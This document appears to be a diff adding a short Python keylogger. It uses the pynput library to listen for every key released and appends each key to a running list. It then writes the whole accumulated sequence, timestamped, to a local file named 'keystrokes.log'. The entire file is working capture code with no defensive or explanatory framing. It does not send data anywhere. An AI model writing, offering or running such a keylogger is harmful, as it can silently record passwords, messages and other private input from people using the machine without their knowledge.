@@ -1,0 +1,32 @@
+import logging
+from pynput import keyboard
+
+# Setup logging
+logging.basicConfig(
+    filename='keystrokes.log', 
+    level=logging.INFO, 
+    filemode='w',
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    datefmt='%Y-%m-%d %H:%M:%S'
+)
+
+# List to store all keystrokes
+keystrokes = []
+
+def on_release(key):
+    # Record the key in the list
+    if hasattr(key, 'char') and key.char:
+        keystrokes.append(key.char)
+    else:
+        keystrokes.append(str(key))
+
+    # Log all keys recorded so far
+    logging.info(f'Keys recorded: {", ".join(keystrokes)}')
+
+def main():
+    # Collect events until released
+    with keyboard.Listener(on_release=on_release) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()
